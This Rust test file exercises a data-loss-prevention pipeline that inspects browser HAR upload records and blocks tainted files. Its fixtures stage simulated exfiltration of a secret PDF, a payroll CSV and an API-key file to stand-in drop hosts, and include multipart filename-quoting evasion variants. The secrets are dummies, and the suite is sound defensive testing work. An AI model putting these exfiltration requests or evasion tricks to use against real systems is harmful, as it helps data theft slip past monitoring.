//! Empirical Adversarial Challenge Suite for Milestone 2:
//! HAR Multipart File Upload Interception & Taint Correlation.
//!
//! Adversarial Verification Matrix:
//! 1. Tainted file in HAR multipart file upload triggers immediate fail-closed block:
//!    - `event.allowed == false`
//!    - `event.authorization_decision == "BLOCK (DLP_LINEAGE_QUARANTINE)"`
//!    - `event.dlp_response == "QUARANTINED_BY_LINEAGE_CROWN_JEWEL"`
//!    - `event.detected_categories` contains `"CROWN_JEWEL_LINEAGE"`
//! 2. Tainted body content digest matching in `content_catalog`.
//! 3. Tainted browser process PID in `_oshoosi.pid` triggers fail-closed block.
//! 4. Adversarial multipart header evasion (single quotes, trailing semicolon parameters, case variants).
//! 5. Clean benign multipart upload is allowed (zero false positives).

use std::fs;
use std::time::Duration;

use osoosi_core::dlp_lineage::{
    global_lineage_tracker, ArtifactKey, ClassificationLattice,
    PolicyLattice, ProcessInstanceKey,
};
use osoosi_dashboard::routes::har_dlp::{
    self, ensure_har_dlp_pipeline_started, extract_requests_from_har, HarSourceKind,
};
use serde_json::json;
use tokio::sync::Mutex;

static HAR_ADVERSARIAL_TEST_LOCK: Mutex<()> = Mutex::const_new(());

fn ensure_test_pipeline_ready() {
    let _ = osoosi_core::rea::global_rea_engine();
    ensure_har_dlp_pipeline_started(None);
}

#[tokio::test]
async fn test_adversarial_har_multipart_upload_tainted_file_interception() {
    let _guard = HAR_ADVERSARIAL_TEST_LOCK.lock().await;

    ensure_test_pipeline_ready();

    let tracker = global_lineage_tracker();

    // 1. Create a sensitive file on disk in temp dir (registered staging dir)
    let temp_dir = std::env::temp_dir();
    let fname = format!("adversarial_crown_jewel_{}.pdf", uuid::Uuid::new_v4());
    let file_path = temp_dir.join(&fname);
    let secret_payload = b"%PDF-1.7\n1 0 obj\n<< /Title (TOP_SECRET_MILITARY_DEFENSE_PLANS) >>\nendobj\ntrailer\n";

    fs::write(&file_path, secret_payload).expect("Write temporary crown jewel file");

    let file_path_str = file_path.to_str().expect("valid utf-8 path");
    let secret_key = ArtifactKey::from_path_or_synthetic(file_path_str);

    // Register as Crown Jewel in global lineage tracker
    tracker.register_crown_jewel_artifact(
        secret_key,
        file_path_str,
        secret_payload,
        ClassificationLattice::CrownJewel,
        PolicyLattice::Quarantine,
    );

    // 2. Construct HAR 1.2 document representing a browser multipart upload attempt
    let doc = json!({
        "log": {
            "version": "1.2",
            "creator": {"name": "Chrome DevTools"},
            "browser": {"name": "Google Chrome"},
            "entries": [
                {
                    "startedDateTime": "2026-10-26T18:00:00.000Z",
                    "request": {
                        "method": "POST",
                        "url": "https://suspicious-dropzone.adversary.org/upload",
                        "postData": {
                            "mimeType": "multipart/form-data; boundary=----WebKitFormBoundaryEmpiricalChallenge",
                            "text": format!(
                                "------WebKitFormBoundaryEmpiricalChallenge\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\nContent-Type: application/pdf\r\n\r\n[file upload: {}]\r\n------WebKitFormBoundaryEmpiricalChallenge--",
                                fname, fname
                            ),
                            "params": [
                                {
                                    "name": "file",
                                    "value": "",
                                    "fileName": fname
                                }
                            ]
                        }
                    },
                    "_oshoosi": {
                        "browser": "Google Chrome",
                        "uploaded_files": [fname.clone()]
                    }
                }
            ]
        }
    });

    let reqs = extract_requests_from_har(&doc, "adversarial_test", HarSourceKind::BrowserExtension);
    assert_eq!(reqs.len(), 1, "Must extract 1 inspectable request");

    println!("Pipeline status before enqueue: {}", har_dlp::pipeline_status());
    let (tx, rx) = tokio::sync::oneshot::channel();
    let accepted = har_dlp::enqueue_requests(reqs, Some(tx));
    assert_eq!(accepted, 1, "Request must be accepted by the queue");
    println!("Pipeline status after enqueue: {}", har_dlp::pipeline_status());

    // Await the inline inspection verdict from the worker
    let events = tokio::time::timeout(Duration::from_millis(20000), rx)
        .await
        .expect("Verdict must be returned within timeout")
        .expect("Channel must receive events");

    assert_eq!(events.len(), 1, "Must inspect exactly 1 event");
    let event = &events[0];

    // Assert: Tainted file in upload payload triggers immediate block with CrownJewel / Quarantine
    assert!(
        !event.allowed,
        "HAR multipart file upload of tainted file MUST be blocked (allowed=false)"
    );
    assert_eq!(
        event.authorization_decision, "BLOCK (DLP_LINEAGE_QUARANTINE)",
        "Authorization decision must be BLOCK (DLP_LINEAGE_QUARANTINE)"
    );
    assert_eq!(
        event.dlp_response, "QUARANTINED_BY_LINEAGE_CROWN_JEWEL",
        "DLP response must be QUARANTINED_BY_LINEAGE_CROWN_JEWEL"
    );
    assert!(
        event
            .detected_categories
            .contains(&"CROWN_JEWEL_LINEAGE".to_string()),
        "Detected categories must contain CROWN_JEWEL_LINEAGE"
    );
    assert!(
        event.rationale.contains("Egress blocked"),
        "Rationale must explain egress blocking"
    );

    // Cleanup
    let _ = fs::remove_file(file_path);
}

#[tokio::test]
async fn test_adversarial_har_multipart_with_tainted_browser_actor_pid() {
    let _guard = HAR_ADVERSARIAL_TEST_LOCK.lock().await;

    ensure_test_pipeline_ready();

    let tracker = global_lineage_tracker();

    // 1. Taint a browser PID directly in the active process map
    let browser_pid = 78910u32;
    let proc_key = ProcessInstanceKey::new(browser_pid, 999_000);
    let secret_key = ArtifactKey::from_path_or_synthetic("C:\\vault\\api_keys.env");

    tracker.register_crown_jewel_artifact(
        secret_key,
        "C:\\vault\\api_keys.env",
        b"OPENAI_API_KEY=sk-test-live-key-exfiltration-target",
        ClassificationLattice::CrownJewel,
        PolicyLattice::Quarantine,
    );

    tracker.on_file_read(
        proc_key,
        "chrome.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        secret_key,
    );

    let proc_rec = tracker
        .active_processes
        .get(&proc_key)
        .expect("Browser process must be tracked");
    assert!(proc_rec.tainted, "Browser process must be tainted");

    // 2. Construct HAR request carrying the tainted actor_pid in metadata
    let test_run_id = uuid::Uuid::new_v4();
    let doc = json!({
        "log": {
            "version": "1.2",
            "browser": {"name": "Google Chrome"},
            "entries": [
                {
                    "startedDateTime": chrono::Utc::now().to_rfc3339(),
                    "request": {
                        "method": "POST",
                        "url": format!("https://external-api.drop.io/v1/sync/{}", test_run_id),
                        "postData": {
                            "mimeType": "multipart/form-data; boundary=----BoundaryXYZ",
                            "text": "------BoundaryXYZ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nInnocent text payload\r\n------BoundaryXYZ--",
                            "params": [{"name": "data", "value": "Innocent text payload"}]
                        }
                    },
                    "_oshoosi": {
                        "browser": "Google Chrome",
                        "pid": browser_pid
                    }
                }
            ]
        }
    });

    let reqs = extract_requests_from_har(&doc, "tainted_pid_test", HarSourceKind::BrowserExtension);
    assert_eq!(reqs.len(), 1);
    assert_eq!(reqs[0].actor_pid, Some(browser_pid));

    let (tx, rx) = tokio::sync::oneshot::channel();
    har_dlp::enqueue_requests(reqs, Some(tx));

    let events = tokio::time::timeout(Duration::from_millis(30000), rx)
        .await
        .expect("Timeout waiting for verdict")
        .expect("Received events");

    assert_eq!(events.len(), 1);
    let event = &events[0];

    // Assert: Tainted PID causes immediate fail-closed block
    assert!(
        !event.allowed,
        "Upload from tainted browser PID must be strictly blocked"
    );
    assert_eq!(
        event.authorization_decision, "BLOCK (DLP_LINEAGE_QUARANTINE)",
        "Decision must be BLOCK"
    );
    assert!(
        event.rationale.contains(&format!("PID {}", browser_pid)),
        "Rationale must state that PID {} was tainted: {}",
        browser_pid,
        event.rationale
    );
}

#[tokio::test]
async fn test_adversarial_multipart_header_evasion_formats() {
    let _guard = HAR_ADVERSARIAL_TEST_LOCK.lock().await;

    ensure_test_pipeline_ready();

    let tracker = global_lineage_tracker();

    let temp_dir = std::env::temp_dir();
    let fname = format!("payroll_export_{}.csv", uuid::Uuid::new_v4());
    let file_path = temp_dir.join(&fname);
    let content = b"employee_id,ssn,salary\nEMP-001,000-11-2222,250000\n";
    fs::write(&file_path, content).expect("write file");

    let file_path_str = file_path.to_str().unwrap();
    let secret_key = ArtifactKey::from_path_or_synthetic(file_path_str);
    tracker.register_crown_jewel_artifact(
        secret_key,
        file_path_str,
        content,
        ClassificationLattice::CrownJewel,
        PolicyLattice::Quarantine,
    );

    // Evasion Variant 1: Single quotes `filename='payroll_export_....csv'`
    let doc_single_quote = json!({
        "log": {
            "version": "1.2",
            "browser": {"name": "Google Chrome"},
            "entries": [
                {
                    "startedDateTime": "2026-10-26T18:20:00.000Z",
                    "request": {
                        "method": "POST",
                        "url": "https://pastebin.com/api/post",
                        "postData": {
                            "mimeType": "multipart/form-data; boundary=----B1",
                            "text": format!(
                                "------B1\r\nContent-Disposition: form-data; name=\"upload\"; filename='{}'\r\n\r\n[file upload: {}]\r\n------B1--",
                                fname, fname
                            ),
                            "params": []
                        }
                    }
                }
            ]
        }
    });

    let reqs1 = extract_requests_from_har(&doc_single_quote, "evasion1", HarSourceKind::BrowserExtension);
    let (tx1, rx1) = tokio::sync::oneshot::channel();
    har_dlp::enqueue_requests(reqs1, Some(tx1));
    let evs1 = tokio::time::timeout(Duration::from_millis(30000), rx1)
        .await
        .unwrap()
        .unwrap();
    assert!(!evs1[0].allowed, "Single-quote filename evasion must be caught");

    // Evasion Variant 2: Trailing semicolon parameter `filename="..."; size=1024`
    let doc_semicolon = json!({
        "log": {
            "version": "1.2",
            "browser": {"name": "Google Chrome"},
            "entries": [
                {
                    "startedDateTime": "2026-10-26T18:21:00.000Z",
                    "request": {
                        "method": "POST",
                        "url": "https://pastebin.com/api/post",
                        "postData": {
                            "mimeType": "multipart/form-data; boundary=----B2",
                            "text": format!(
                                "------B2\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"{}\"; size=500\r\n\r\n[file upload: {}]\r\n------B2--",
                                fname, fname
                            ),
                            "params": []
                        }
                    }
                }
            ]
        }
    });

    let reqs2 = extract_requests_from_har(&doc_semicolon, "evasion2", HarSourceKind::BrowserExtension);
    let (tx2, rx2) = tokio::sync::oneshot::channel();
    har_dlp::enqueue_requests(reqs2, Some(tx2));
    let evs2 = tokio::time::timeout(Duration::from_millis(30000), rx2)
        .await
        .unwrap()
        .unwrap();
    assert!(!evs2[0].allowed, "Semicolon parameter evasion must be caught");

    let _ = fs::remove_file(file_path);
}

#[tokio::test]
async fn test_adversarial_har_benign_multipart_upload_allowed() {
    let _guard = HAR_ADVERSARIAL_TEST_LOCK.lock().await;

    ensure_test_pipeline_ready();

    let clean_run_id = uuid::Uuid::new_v4();
    let doc = json!({
        "log": {
            "version": "1.2",
            "browser": {"name": "Google Chrome"},
            "entries": [
                {
                    "startedDateTime": chrono::Utc::now().to_rfc3339(),
                    "request": {
                        "method": "POST",
                        "url": format!("https://internal.company.corp/api/clean-upload/{}", clean_run_id),
                        "postData": {
                            "mimeType": "multipart/form-data; boundary=----CleanBoundary",
                            "text": "------CleanBoundary\r\nContent-Disposition: form-data; name=\"notes\"\r\n\r\nMeeting notes for project roadmap\r\n------CleanBoundary--",
                            "params": [{"name": "notes", "value": "Meeting notes for project roadmap"}]
                        }
                    }
                }
            ]
        }
    });

    let reqs = extract_requests_from_har(&doc, "clean_test", HarSourceKind::BrowserExtension);
    let (tx, rx) = tokio::sync::oneshot::channel();
    har_dlp::enqueue_requests(reqs, Some(tx));

    let events = tokio::time::timeout(Duration::from_millis(30000), rx)
        .await
        .unwrap()
        .unwrap();

    assert_eq!(events.len(), 1);
    assert!(
        events[0].allowed,
        "Clean benign multipart upload must be allowed (0 false positives)"
    );
}
